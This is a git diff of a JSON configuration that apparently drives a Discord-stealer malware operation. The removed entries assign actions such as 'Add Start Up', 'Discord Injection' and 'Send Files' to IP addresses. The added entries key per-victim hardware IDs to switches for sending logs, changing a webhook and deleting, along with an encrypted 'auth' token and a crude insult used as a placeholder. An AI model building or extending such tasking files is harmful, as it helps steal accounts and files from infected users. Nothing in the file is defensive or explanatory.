@@ -1,18 +1,20 @@
 {
-    "custom":[
-        {
-            "id":"192.168.1.0",
-            "process":[
-                {"value": "Add Start Up"},
-                {"value":"Send Again"}
-            ]
-        },
-        {
-            "id":"191.167.1.31",
-            "process":[
-                {"value": "Discord Injection"},
-                {"value":"Send Files"}
-            ]
-        }
-    ]
+    "3AA5C9AD-E3A8-5712-A785-2CF05D3736A0":{
+        "sendLogs":0,
+        "cWebhook":1,
+        "delete":0,
+        "auth":"gAAAAABjFxTRsjvCNJLBYTAQWjhEX1N4pqslz_WP-foULCUw5nhKkUuY2tbiK474SZvbglS9yLRJSGA6pmO52E7KcfoP1hE-ewIxN_H3-DzprUYrK4nVofOpUe_PmhfsCV1YW3D15PncxDqU21dgrHePkcKa7B0WAb0Be7MVTLGnC8vAR5pBbImbZ7jVKl4lCTdi0V8hnAvK23Af4cv9-qZBsdv0sdGb_loXRhlq_jKntTow_2d6mtQ=/flew/UyE4QOaz552T1COqMZ6Bfx4sr8NvTd4pruEdIkH_ynI="
+    },
+    "3AA5C9AD-E3A8-5712-A785-2CF05D3736A5":{
+        "sendlogs":0,
+        "cwebhook":0,
+        "delete":1,
+        "auth":"ananinami"
+    },
+    "3AA5C9AD-E3A8-5712-A785-2CF05D3736B5":{
+        "sendlogs":0,
+        "cwebhook":0,
+        "delete":0,
+        "auth":"ananinami"
+    }
 }
